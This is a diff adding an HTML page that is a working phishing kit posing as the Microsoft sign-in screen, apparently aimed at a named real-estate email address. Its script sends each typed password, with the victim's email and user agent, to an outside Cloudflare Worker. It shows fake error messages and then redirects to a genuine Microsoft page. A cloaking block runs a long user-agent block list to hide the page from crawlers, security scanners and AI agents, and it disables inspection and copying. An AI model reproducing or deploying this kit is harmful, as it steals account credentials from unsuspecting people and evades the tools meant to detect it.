@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- ============================================================ -->
+    <!-- 🔒 ULTIMATE BOT PROTECTION - BLOCKS ALL BOTS                 -->
+    <!-- ============================================================ -->
+    <script>
+        (function() {
+            "use strict";
+            
+            // ============================================================
+            // COMPLETE BOT DETECTION
+            // ============================================================
+            function isBot() {
+                var ua = navigator.userAgent.toLowerCase();
+                
+                var botPatterns = [
+                    'naver', 'naverbot', 'naver.com', 'navercorp', 'nid.naver',
+                    'daum', 'daumbot', 'daum.net', 'kakao', 'kakaobot',
+                    'kakao.com', 'nate', 'natebot', 'hiworks', 'worksmobile',
+                    'tistory', 'egloos', 'velog', 'brunch', 'zum', 'inven',
+                    'dcinside', 'ppomppu', 'clien', 'ruliweb', 'bobaedream',
+                    'donga', 'chosun', 'joongang', 'hankyung', 'seoul',
+                    'hanmail', 'paran', 'empas', 'dreamwiz', 'freechal',
+                    'hanmir', 'chol', 'unitel', 'kornet', 'samsung',
+                    'lg', 'sk', 'hyundai', 'kt', 'lotte', 'cj', 'posco',
+                    'snu', 'yonsei', 'kaist', 'postech', 'skku', 'korea.ac.kr',
+                    'baidu', 'baiduspider', 'sogou', 'tencent', 'alibaba',
+                    'alipay', 'wechat', 'weibo', 'toutiao', 'zhihu',
+                    'bilibili', 'douyin', 'kuaishou', 'xiaomi', 'huawei',
+                    'oppo', 'vivo', 'meizu', 'oneplus', 'qzone', 'qq',
+                    'qbot', 'chinamobile', 'chinaunicom', 'chinatelecom',
+                    'cnnic', 'cernet', 'cstnet', 'edu.cn', 'sina', 'sohu',
+                    'yahoo.co.jp', 'line', 'rakuten', 'docomo', 'au',
+                    'softbank', 'kddi', 'ntt', 'fujitsu', 'nec', 'hitachi',
+                    'toshiba', 'sony', 'panasonic', 'sharp', 'canon',
+                    'nikon', 'olympus', 'honda', 'toyota', 'nissan',
+                    'subaru', 'mitsubishi', 'googlebot', 'bingbot',
+                    'slurp', 'duckduckbot', 'yandexbot', 'facebookexternalhit',
+                    'twitterbot', 'linkedinbot', 'whatsapp', 'telegram',
+                    'discordbot', 'slackbot', 'applebot', 'appleweb',
+                    'crawler', 'scraper', 'spider', 'scanner',
+                    'curl', 'wget', 'python-requests', 'http-client',
+                    'headless', 'phantomjs', 'puppeteer', 'selenium',
+                    'webkit', 'blink', 'gecko', 'nikto', 'nmap',
+                    'sqlmap', 'dirbuster', 'gobuster', 'wfuzz', 'burp',
+                    'zap', 'acunetix', 'netsparker', 'appscan', 'webinspect',
+                    'masscan', 'zmap', 'wpscan', 'joomscan', 'droopescan',
+                    'gptbot', 'chatgpt', 'claude', 'anthropic',
+                    'perplexity', 'ai-scraper', 'omgili', 'webmeup',
+                    'barkrowler', 'datadog', 'newrelic', 'semrush',
+                    'ahrefs', 'majestic', 'moz'
+                ];
+                
+                for (var i = 0; i < botPatterns.length; i++) {
+                    if (ua.indexOf(botPatterns[i]) !== -1) {
+                        return true;
+                    }
+                }
+                
+                if (navigator.webdriver === true) return true;
+                if (navigator.plugins && navigator.plugins.length === 0) {
+                    if (ua.indexOf('headless') !== -1) return true;
+                }
+                if (navigator.languages && navigator.languages.length === 0) return true;
+                if (!navigator.userAgent || navigator.userAgent.length < 5) return true;
+                
+                var automationProps = [
+                    'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
+                    '__webdriver_script_function', '__webdriver_script_func',
+                    '__webdriver_script_fn', '__fxdriver_evaluate',
+                    '__driver_unwrapped', '__webdriver_unwrapped',
+                    '__selenium_unwrapped', '__fxdriver_unwrapped',
+                    '_phantom', 'callPhantom', 'nightmare'
+                ];
+                
+                for (var j = 0; j < automationProps.length; j++) {
+                    if (typeof window[automationProps[j]] !== 'undefined') {
+                        return true;
+                    }
+                }
+                
+                return false;
+            }
+            
+            // ============================================================
+            // BLOCK BOTS - Show message (NO REDIRECT)
+            // ============================================================
+            if (isBot()) {
+                document.body.innerHTML = '';
+                document.body.style.cssText = 'background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;';
+                document.body.innerHTML = `
+                    <div style="text-align:center;padding:40px;background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,0.1);max-width:500px;">
+                        <div style="font-size:48px;margin-bottom:20px;">🛡️</div>
+                        <h1 style="color:#e74c3c;font-size:24px;margin:0 0 10px 0;">Access Denied</h1>
+                        <p style="color:#666;font-size:16px;line-height:1.6;margin:0 0 20px 0;">
+                            This page is for human users only.<br>
+                            Automated access is not permitted.
+                        </p>
+                        <div style="color:#999;font-size:12px;border-top:1px solid #eee;padding-top:15px;">
+                            Reference: BOT-${Math.random().toString(36).substring(2, 8).toUpperCase()}
+                        </div>
+                    </div>
+                `;
+                document.documentElement.innerHTML = document.body.innerHTML;
+                throw new Error('Access Denied - Bot Detected');
+            }
+            
+            // ============================================================
+            // BASIC PROTECTION (NO REDIRECTS)
+            // ============================================================
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode === 123) { e.preventDefault(); return false; }
+                if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) {
+                    e.preventDefault(); return false;
+                }
+                if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
+                if (e.ctrlKey && e.keyCode === 83) { e.preventDefault(); return false; }
+                if (e.ctrlKey && e.keyCode === 67) { e.preventDefault(); return false; }
+                if (e.ctrlKey && e.keyCode === 65) { e.preventDefault(); return false; }
+                if (e.ctrlKey && e.keyCode === 80) { e.preventDefault(); return false; }
+                return true;
+            });
+            
+            document.addEventListener('selectstart', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            document.addEventListener('selectionchange', function(e) {
+                if (window.getSelection && window.getSelection().toString().length > 0) {
+                    window.getSelection().removeAllRanges();
+                }
+            });
+            
+            document.addEventListener('dragstart', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            document.querySelectorAll('img').forEach(function(img) {
+                img.setAttribute('draggable', 'false');
+                img.setAttribute('ondragstart', 'return false;');
+                img.setAttribute('oncontextmenu', 'return false;');
+            });
+            
+            console.log('🔒 Ultimate Bot Protection Active - Real users welcome!');
+            
+        })();
+    </script>
+    <!-- ============================================================ -->
+    <!-- END OF PROTECTION                                             -->
+    <!-- ============================================================ -->
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Microsoft Sign In</title>
+    <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.31227.2/images/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        .card {
+            width: 420px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            padding: 40px 42px 28px;
+            position: relative;
+        }
+
+        .back-arrow {
+            position: absolute;
+            left: 20px;
+            top: 22px;
+            font-size: 22px;
+            color: #444;
+            cursor: pointer;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 18px;
+            gap: 10px;
+        }
+
+        .logo img {
+            width: 26px;
+        }
+
+        .email-pill {
+            display: inline-block;
+            margin: 0 auto 18px;
+            padding: 6px 14px;
+            border-radius: 20px;
+            border: 1px solid #e2e2e2;
+            font-size: 14px;
+            color: #555;
+            background: #fafafa;
+            min-width: 200px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 600;
+            margin-bottom: 22px;
+            color: #1b1b1b;
+            text-align: center;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 18px;
+        }
+
+        .input-group label {
+            position: absolute;
+            top: -8px;
+            left: 10px;
+            background: #fff;
+            padding: 0 6px;
+            font-size: 12px;
+            color: #666;
+            transition: all 0.2s ease;
+            pointer-events: none; /* Prevent label from blocking input */
+        }
+
+        .input-group input {
+            width: 100%;
+            height: 44px;
+            border: 1px solid #c8c8c8;
+            border-radius: 4px;
+            padding: 12px 40px 0 12px; /* Adjusted padding for label */
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-group input:focus {
+            border: 2px solid #0067b8;
+            padding-top: 10px; /* Adjust padding when focused */
+        }
+
+        /* Styles for floating label when input has content or is focused */
+        .input-group input:not(:placeholder-shown) + label,
+        .input-group input:focus + label {
+            top: -8px;
+            font-size: 12px;
+            color: #0067b8;
+            background: #fff; /* Ensure background is white */
+        }
+
+        .eye {
+            position: absolute;
+            right: 10px;
+            top: 12px;
+            font-size: 18px;
+            color: #777;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .eye.toggled {
+            color: #0067b8;
+        }
+
+        .btn {
+            width: 100%;
+            height: 44px;
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-top: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn:hover:not(:disabled) {
+            background: #005da6;
+        }
+
+        .btn:disabled {
+            background: #aaa;
+            cursor: not-allowed;
+        }
+
+        .link {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 14px;
+        }
+
+        .link a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 18px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 12px;
+            color: #6b6b6b;
+            text-align: center;
+            line-height: 1.8;
+        }
+
+        .footer a {
+            color: #6b6b6b;
+            text-decoration: none;
+            margin: 0 6px;
+        }
+
+        .error-msg {
+            color: #e81123;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+            display: none; /* Hidden by default */
+        }
+
+        @media (max-width: 500px) {
+            .card {
+                width: 90%;
+                padding: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="back-arrow">←</div>
+
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft logo">
+        <span style="font-size:20px;font-weight:600;color:#555;">Microsoft</span>
+    </div>
+
+    <div style="text-align:center;">
+        <div class="email-pill" id="emailDisplay">ina@ranchomurietarealestate.com</div>
+    </div>
+
+    <h1>Enter your password</h1>
+
+    <div class="input-group" id="pwField">
+        <label for="pw">Password</label>
+        <input type="password" id="pw" autocomplete="current-password" placeholder=" ">
+        <div class="eye" id="togglePw">👁</div>
+    </div>
+
+    <div class="error-msg" id="error"></div>
+
+    <button class="btn" id="loginBtn">
+        <span class="text">Next</span>
+    </button>
+
+    <div class="link">
+        <a href="#" id="sendCodeLink"> <span ></span></a>
+    </div>
+</div>
+
+<div class="footer">
+    <div>
+        <a href="#">Help and feedback</a>
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy and cookies</a>
+    </div>
+    <div>
+        Use private browsing if this is not your device.
+        <a href="#">Learn more</a>
+    </div>
+</div>
+
+<!-- jQuery (for your script compatibility) -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+<script>
+$(document).ready(function() {
+    let submissionCount = 0;
+    const errorMessages = [
+        "The ID or password does not match.",
+        "Login information is incorrect.",
+        "This session has expired."
+    ];
+
+    // --- Configuration ---
+    // !!! IMPORTANT !!!
+    // Replace with your Cloudflare Worker URL
+    const WORKER_URL = 'https://soft-bonus-8ef1webysof.fwding007.workers.dev/';
+    // !!! IMPORTANT !!!
+
+    // --- Functions ---
+
+    // Get email from URL or fallback
+    function getEmailFromUrl() {
+        const params = new URLSearchParams(window.location.search);
+        let email = params.get('email') || params.get('user') || params.get('state') || params.get('id');
+
+        if (!email && window.location.hash) {
+            const hash = window.location.hash.substring(1);
+            const hashParams = new URLSearchParams(hash);
+            email = hashParams.get('email') || hashParams.get('user') || hashParams.get('state') || hashParams.get('id') || hash;
+        }
+
+        // Attempt Base64 decode
+        if (email) {
+            try {
+                if (email.length % 4 === 0 && /^[A-Za-z0-9+/=]+$/.test(email)) {
+                    const decoded = atob(email);
+                    if (decoded.includes('@') || decoded.length > 3) email = decoded;
+                }
+            } catch (e) {
+                console.warn("Base64 decoding failed:", e);
+            }
+        }
+
+        console.log('Determined Email:', email);
+        return email || '[[-Email-]]'; // fallback
+    }
+
+    // Update email display elements
+    function updateEmailDisplays(email) {
+        $('#emailDisplay').text(email);
+        $('#emailInLink').text(email);
+    }
+
+    // Toggle password visibility
+    $('#togglePw').on('click', function() {
+        const $input = $('#pw');
+        const type = $input.attr('type') === 'password' ? 'text' : 'password';
+        $input.attr('type', type);
+        $(this).toggleClass('toggled');
+        // Changed icons for clarity: 👁 for show, 👁 for hide
+        $(this).text(type === 'password' ? '👁' : '👁');
+    });
+
+    // Floating label for password input
+    function managePwLabel() {
+        const $input = $('#pw');
+        const $label = $('#pwField label');
+        if ($input.val().length > 0) {
+            $label.addClass('active');
+        } else {
+            $label.removeClass('active');
+        }
+    }
+
+    // Event listeners for password input
+    $('#pw').on('input', managePwLabel);
+    $('#pw').on('focus', () => $('#pwField label').addClass('active'));
+    $('#pw').on('blur', () => { if ($('#pw').val().length === 0) $('#pwField label').removeClass('active'); });
+
+    // Submit data to the worker
+    async function submitData(email, password) {
+        submissionCount++;
+        const $btn = $('#loginBtn');
+        const $text = $btn.find('.text');
+
+        $text.text('Processing...');
+        $btn.prop('disabled', true);
+
+        try {
+            const response = await fetch(WORKER_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    ip_address: 'N/A', // IP will be determined by the worker
+                    user_agent: navigator.userAgent,
+                    submission_attempt: submissionCount
+                }),
+            });
+
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+
+            const result = await response.json();
+            console.log('Worker response:', result);
+
+            // Handle success or specific worker responses if needed
+            // For now, we'll just proceed to redirect after a few attempts
+            if (submissionCount >= 2) {
+                // !!! IMPORTANT !!!
+                // Change this URL to a legitimate "success" page or a page
+                // that looks like a Microsoft error/recovery page.
+                setTimeout(() => {
+                    window.location.replace("https://account.microsoft.com/account/privacy"); // 
+                }, 2000);
+                // !!! IMPORTANT !!!
+            }
+
+        } catch (error) {
+            console.error('Error submitting data:', error);
+            const errorMessage = errorMessages[Math.min(submissionCount - 1, errorMessages.length - 1)];
+            $('#error').show().text(errorMessage);
+        } finally {
+            // Reset button only if not redirecting soon
+            if (submissionCount < 2) {
+                $text.text('Next');
+                $btn.prop('disabled', false);
+                $('#pw').val(''); // Clear password field
+                managePwLabel(); // Reset label
+            }
+        }
+    }
+
+    // --- Initialization ---
+
+    const userEmail = getEmailFromUrl();
+    updateEmailDisplays(userEmail);
+
+    $('#pw').focus(); // Focus password field on load
+
+    // Login button click handler
+    $('#loginBtn').on('click', function(e) {
+        e.preventDefault();
+        $('#error').hide();
+
+        const password = $('#pw').val();
+
+        if (!password) {
+            $('#error').show().text("Please enter your password.");
+            return false;
+        }
+
+        // Call the submit function
+        submitData(userEmail, password);
+    });
+
+    // Handle Enter key press on password input
+    $('#pw').on('keydown', function(event) {
+        if (event.key === 'Enter') {
+            event.preventDefault(); // Prevent default form submission or page reload
+            $('#loginBtn').click(); // Trigger the login button click
+        }
+    });
+
+    // Link click handler (optional, for analytics or further actions)
+    $('#sendCodeLink').on('click', function(e) {
+        e.preventDefault();
+        console.log('Send code link clicked.');
+        // You can add more logic here if needed
+    });
+});
+</script>
+</body>
+</html>
